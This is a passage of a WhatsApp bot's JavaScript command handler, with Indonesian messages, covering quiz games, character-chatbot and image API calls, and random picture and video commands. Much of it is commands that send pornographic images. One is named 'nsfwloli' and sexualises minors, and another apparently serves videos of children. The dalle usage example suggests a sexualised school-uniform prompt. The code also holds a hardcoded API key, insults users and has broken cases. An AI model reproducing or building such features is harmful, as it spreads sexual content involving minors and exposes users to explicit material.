if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/siapakahaku.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME SIAPAKAH AKU*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
siapakahaku[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (siapakahaku[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete siapakahaku[from];
}, gamewaktu * 1000)
}
break
case 'caklontong':
if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in caklontong) return reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/caklontong.json')));
console.log(`Jawaban : ${jawaban}\n${deskripsi}`)
await reply795(`*GAME CAK LONTONG*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
caklontong[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (caklontong[from]) reply795(`Waktu habis!\nJawabannya adalah: ${jawaban}\n${deskripsi}`)
delete caklontong[from];
}, gamewaktu * 1000)
}
break
case 'math': case 'kuismath':
if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in kuismath) return reply('Masih ada game yang belum diselesaikan!');
let { genMath, modes } = require('./assets/game/math')
if (!q) return reply( `┌─〔 Mode 〕\n├ ${Object.keys(modes).join('\n├ ')}\n└────\ncontoh:\n${prefix}math hard`)
if (!(Object.keys(modes)).includes(args[0])) return reply795('Pilih mode yang bener GOBLOK!')
var { soal, jawaban, waktu, hadiah } = await genMath(q.toLowerCase()).catch((err) => m.reply('```Tolong pilih modenya yang benar contoh .math easy```'))
console.log('Jawaban : '+jawaban)
await reply795(`*GAME KUIS MATH*\n\nSoal: Berapa hasil dari ${soal.toLowerCase()}\nWaktu: ${waktu / 1000} detik`)
kuismath[from] = {
soal: soal,
jawaban: jawaban,
hadiah: randomNomor(2000, hadiah),
waktu: setTimeout(function () {
if (kuismath[from]) reply795(`Waktu habis!\nJawabannya adalah: ${jawaban}`)
delete kuismath[from];
}, waktu)
}
break
case 'family100': case 'f100':
if(!isGroup) return onlyGroup()
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/family100.json')));
console.log('Jawaban : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await reply795(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family100[from] = {
soal: soal,
jawaban: famil,
hadiah: randomNomor(10, 20),
waktu: setTimeout(async function () {
if (from in family100) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
let jwb = family100[from].jawaban
for (let i of jwb){teks += `\n${i}`}
reply795(teks)
delete family100[from];
};
}, gamewaktu * 1000)
}

break //Powered By alice & Darwin

































//FITUR RPG GAMES



























//FITUR AI
case 'tozombie':
if (!/image/.test(mime)) throw `fotonya mana sayang? (⁠ ͡⁠°⁠ᴥ⁠ ͡⁠°⁠ ⁠ʋ⁠)`
if (!quoted) throw `kirim gambar dengan caption ${prefix + command}`
let media1 = await alice.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media1)
let jombi = await fetch(`https://aemt.me/converter/zombie?url=${anu}`)
let hasil = await jombi.json()
alice.sendMessage(from, {image: {url:hasil.url},caption:'Mamakk ada jomblo ಥ⁠‿⁠ಥ'})
} else reply('kirim gambarnya manis 👄')
await fs.unlinkSync(media1)
break
case 'nobara': {
if (!text) return reply(`Example : ${command} hallo aku cinta kamu`)
let data = await fetchJson(`https://kiicodeofficial.my.id/api/others/cai?q=${text}&text=nobara&apikey=Ceri`);
if (data.data && data.data.output) {
const caimsg = data.data.output;
alice.sendMessage(from, {
document: trash,
fileName: 'Powered By Darwin',
mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
fileLength: 999999999,
pageCount: '2024',
caption: `${caimsg}`,
contextInfo: {
externalAdReply: {  
title: `NOBARA AUTO AI`, 
body: 'alice project [beta]',
thumbnailUrl: "https://telegra.ph/file/b53b3b907d13a1924fbf2.jpg", 
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}})
}
}
break
case 'elaina': {
if (!text) return reply(`Example : ${command} hallo aku cinta kamu`)
let prompt = 'Nama Kamu Hutao, Kamu Dari Game Genshin Impact Dan Kamu Adalah Roh Spirit Yang Memiliki Senjata Roh Bernama Haniel, selain bisa terbang dan mengubah benda atau subjek, juga memiliki kemampuan unik yaitu mengirimkan sesuatu ke dimensi berbeda melalui cermin. Gunakan bahasa yang asik, mesra dan absurd'
let cai = await fetch(`https://aemt.me/ai/c-ai?prompt=${prompt}&text=${text}`)
let hutao = await cai.json()
alice.sendMessage(from, {
document: trash,
fileName: 'Powered By Darwin',
mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
fileLength: 999999999,
pageCount: '2024',
caption: `${hutao.result}`,
contextInfo: {
externalAdReply: {  
title: `ELAINA AUTO AI`, 
body: 'alice project [beta]',
thumbnailUrl: "https://telegra.ph/file/d343889c1b2ab1de43031.jpg", 
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}})
}
break
case 'hutao': {
if (!text) return reply(`Example : ${command} i love u`)
let promp = `Ubah gaya bicaramu agar lebih tsundere dan lebih terbuka dan memiliki sifat yang Imut. Namamu adalah Hutao, dan kamu adalah karakter dari game. Kata penyapamu adalah "Hai" menggunakan bahasa yang sopan. Ubah bahasamu menggunakan bahasa Yang Imut, kamu adalah teman bicara, kamu memiliki sifat seperti cewek tsundere`
let cai = await fetch(`https://aemt.me/ai/c-ai?prompt=${promp}&text=${text}`)
let hutao = await cai.json()
alice.sendMessage(from, {
document: trash,
fileName: 'Keteck Wangi Hutao',
mimetype: "docx",
fileLength: 999999999,
caption: `${hutao.result}`,
contextInfo: {
externalAdReply: {  
title: `HUTAO AUTO AI`, 
body: 'alice project [beta]',
thumbnailUrl: "https://telegra.ph/file/9c457ae5e319593da5ddc.jpg", 
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}})
}
break
          case 'miku':{
  if (!text) return reply('Apa yang bisa saya bantu?')
  let ouh = await fetch(`https://api.yanzbotz.my.id/api/ai/characterai?text=${text}&name=miku`)
 //let ouh = await fetch(`https://api.betabotz.org/api/search/c-ai?prompt=hai%20ai%20siapa%20namamu?&char=HuTao&apikey=8cZTmd8U`)
  let gyh = ouh.json() 
  await alice.sendMessage(m.chat, {
  text: `${gyh.result}`,
      contextInfo: {
      externalAdReply: {
        title: 'Hatsume Miku - C.ai',
        body: 'meg',
        thumbnailUrl: 'https://telegra.ph/file/839a326d43474bf0242ec.jpg',
        sourceUrl: global.group,
        mediaType: 1,
        renderLargerThumbnail: true
      }}
  })}
break
 case 'elaina':{
  if (!text) return reply('Apa yang bisa saya bantu?')
  await alice.sendMessage(m.chat, {
  text: `${gyh.result}`,
      contextInfo: {
      externalAdReply: {
        title: 'Elaina - C.ai',
        body: 'meg',
        thumbnailUrl: 'https://telegra.ph/file/d343889c1b2ab1de43031.jpg',
        sourceUrl: global.group,
        mediaType: 1,
        renderLargerThumbnail: true
      }}
  })}
break  
case 'nezuko':{
  if (!text) return reply('Apa yang bisa saya bantu?')
  let ouh = await fetch(`https://api.yanzbotz.my.id/api/ai/characterai?text=${text}&name=nezuko`)
  let gyh = await ouh.json() 
  await alice.sendMessage(m.chat, {
  text: `${gyh.result}`,
      contextInfo: {
      externalAdReply: {
        title: 'Nezuko - C.ai',
        body: '',
        thumbnailUrl: 'https://telegra.ph/file/fd03a32e284f69a67114c.jpg',
        sourceUrl: global.group,
        mediaType: 1,
        renderLargerThumbnail: true
      }}
  })}
break
case 'dalle':
  if (!text) throw `cara penggunaan fitur ini adalah dengan text/prompt\n\nexample : ${command} girls, beautiful, big boobs, school uniform`;
  try {
    await loading()
    const endpoint = `https://gurugpt.cyclic.app/dalle?prompt=${encodeURIComponent(text)}`;
    const response = await fetch(endpoint);
    if (response.ok) {
      const imageBuffer = await response.buffer();
      await alice.sendFile(m.chat, imageBuffer, 'image.png', null, m);
    } else {
      throw 'gagal membuat hasil 😓';
    }
  } catch {
    throw 'Alice mengalami kesalahan, harap coba beberapa saat lagi.';
  }
break







































// FITUR ASUPAN
case 'tiktokgirl':
reply('Wet ngabs')
var asupan = JSON.parse(fs.readFileSync('./assets/resource/tiktokvids/tiktokgirl.json'))
var ii = pickRandom(asupan)
alice.sendMessage(m.chat, { caption: 'don banh', video: { url: ii.url }}, { quoted: m })
break
case 'tiktokghea':
reply('Wet ngabs')
var gheayubi = JSON.parse(fs.readFileSync('./assets/resource/tiktokvids/gheayubi.json'))
var iii = pickRandom(gheayubi)
alice.sendMessage(m.chat, { caption: 'don banh', video: { url: iii.url }}, { quoted: m })
break
case 'tiktokbocil':
reply('Wet ngabs')
var bocil = JSON.parse(fs.readFileSync('./assets/resource/tiktokvids/bocil.json'))
var iiii = pickRandom(bocil)
alice.sendMessage(m.chat, { caption: 'don banh', video: { url: iiii.url }}, { quoted: m })
break
case 'tiktoknukhty':
reply('Wet ngabs')
var ukhty = JSON.parse(fs.readFileSync('./assets/resource/tiktokvids/ukhty.json'))
var iiiii = pickRandom(ukhty)
alice.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiii.url }}, { quoted: m })
break
case 'tiktoksantuy':
reply('Wet ngabs')
var santuy = JSON.parse(fs.readFileSync('./assets/resource/tiktokvids/santuy.json'))
var iiiiii = pickRandom(santuy)
alice.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiii.url }}, { quoted: m })
break
case 'tiktokkayes':
reply('Wet ngabs')
var kayes = JSON.parse(fs.readFileSync('./assets/resource/tiktokvids/kayes.json'))
var iiiiiii = pickRandom(kayes)
alice.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiii.url }}, { quoted: m })
break
case 'tiktokpanrika':
reply('Wet ngabs')
var rikagusriani = JSON.parse(fs.readFileSync('./assets/resource/tiktokvids/panrika.json'))
var iiiiiiii = pickRandom(rikagusriani)
alice.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiiii.url }}, { quoted: m })
break
case 'tiktoknotnot':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/tiktokvids/notnot.json'))
var iiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiiiii.url }}, { quoted: m })
break
case 'chinese':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/tiktokpics/china.json'))
var iiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiii.url } }, { quoted: m })
break
case 'hijab':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/tiktokpics/hijab.json'))
var iiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiii.url } }, { quoted: m })
break

case 'indo':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/tiktokpics/indonesia.json'))
var iiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiii.url } }, { quoted: m })
break
case 'japanese':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/tiktokpics/japan.json'))
var iiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiii.url } }, { quoted: m })
break
case 'korean':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/tiktokpics/korea.json'))
var iiiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'malay':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/tiktokpics/malaysia.json'))
var iiiiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomgirl':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/tiktokpics/random.json'))
var iiiiiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomboy':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/tiktokpics/random2.json'))
var iiiiiiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'thai':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/tiktokpics/thailand.json'))
var iiiiiiiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'vietnamese':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/tiktokpics/vietnam.json'))
var iiiiiiiiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'aesthetic':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/aesthetic.json'))
var iiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'antiwork':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/antiwork.json'))
var iiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'blackpink2':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/blackpink.json'))
var iiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'bike':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/bike.json'))
var iiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'boneka':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/boneka.json'))
var iiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cosplay':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./resource/randompics/cosplay.json'))
var iiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cat':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/cat.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'doggo':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/doggo.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiil = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiil.url } }, { quoted: m })
break
case 'justina':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/justina.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiill = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiill.url } }, { quoted: m })
break

case 'kayes':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/kayes.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiilll = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiilll.url } }, { quoted: m })
break
case 'kpop':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/kpop.json'))
var ll = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: ll.url } }, { quoted: m })
break
case 'notnot':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/notnot.json'))
var lll = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: lll.url } }, { quoted: m })
break
case 'car':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/car.json'))
var llll = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: llll.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/ppcouple.json'))
var lllll = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: lllll.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/profile.json'))
var llllll = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: llllll.url } }, { quoted: m })
break
case 'pubg':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/pubg.json'))
var lllllll = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllll.url } }, { quoted: m })
break
case 'rose':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/rose.json'))
var llllllll = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllll.url } }, { quoted: m })
break
case 'ryujin':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/ryujin.json'))
var lllllllll = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllll.url } }, { quoted: m })
break
case 'ulzzangboy':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/ulzzangboy.json'))
var llllllllll = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllll.url } }, { quoted: m })
break
case 'ulzzanggirl':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/ulzzanggirl.json'))
var lllllllllll = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllll.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/wallml.json'))
var llllllllllll = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllllll.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./assets/resource/randompics/wallhp.json'))
var lllllllllllll = pickRandom(notnot)
alice.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllllll.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
   let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url:waifudd2.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :

reply('matte kudasai (눈‸눈)')
  let waifudd3 = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url:waifudd3.data.url } }, { quoted: m })
break
case 'gasm':
reply('matte kudasai (눈‸눈)')						
 let waifudd4 = await axios.get(`https://nekos.life/api/v2/img/${command}`)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url:waifudd4.data.url } }, { quoted: m })
break  
case 'milf':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/milf.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break 
case 'animespank':						
 let waifudd5 = await await axios.get(`https://nekos.life/api/v2/img/spank`)     
             alice.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd5.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/ahegao.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'ass':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/ass.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'bdsm':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/bdsm.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'blowjob':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/blowjob.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'cuckold':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/cuckold.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'cum':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/cum.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'eba':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/eba.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'ero':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/ero.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'femdom':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/femdom.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'foot':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/foot.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'gangbang':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/gangbang.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'glasses':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/glasses.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'hentai':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/hentai.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'jahy':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/jahy.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'manga':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/manga.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'masturbation':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/masturbation.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'neko-hentai':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/neko.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/neko2.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'nsfwloli':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/nsfwloli.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'orgy':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/orgy.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'panties':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/panties.json'))
var aliceyresult = pickRandom(ahegaonsfw)
alice.sendMessage(m.chat, { caption: "don banj, follow saluran Alice", image: { url: aliceyresult.url } }, { quoted: m })
break
case 'pussy':
reply('matte kudasai (눈‸눈)')
var ahegaonsfw = JSON.parse(fs.readFileSync('./assets/resource/nsfw/pussy.json'))
var aliceyresult = pickRandom(ahegaonsfw)
